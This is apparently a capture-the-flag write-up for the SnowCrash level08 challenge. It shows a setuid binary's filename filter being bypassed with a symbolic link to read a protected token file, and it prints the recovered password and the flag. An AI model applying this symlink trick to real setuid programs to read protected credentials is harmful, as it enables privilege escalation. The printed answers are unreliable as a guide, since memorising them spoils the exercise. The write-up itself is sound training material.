# Flag 08

In level08 home directory we found two files

```
level08@SnowCrash:~$ ls -l
total 16
-rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
-rw-------  1 flag08 flag08    26 Mar  5  2016 token
```
we used binary ninja again and the binary is taking a file name a an argument and reading from it and printing it's content in one condition if the argument does not contain the string `token` or it will just print `You may not access 'token'`
```
level08@SnowCrash:~$ ./level08 token 
You may not access 'token'

```
all we have to do is to give the binary our file but without the `token` word in the argument, so we used a symbolic link 😜.

```
level08@SnowCrash:~$ ln -s /home/user/level08/token /tmp/link
level08@SnowCrash:~$ ./level08 /tmp/link
quif5eloekouj29ke0vouxean
level08@SnowCrash:~$ su flag08
Password: 
Don't forget to launch getflag !
flag08@SnowCrash:~$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f

```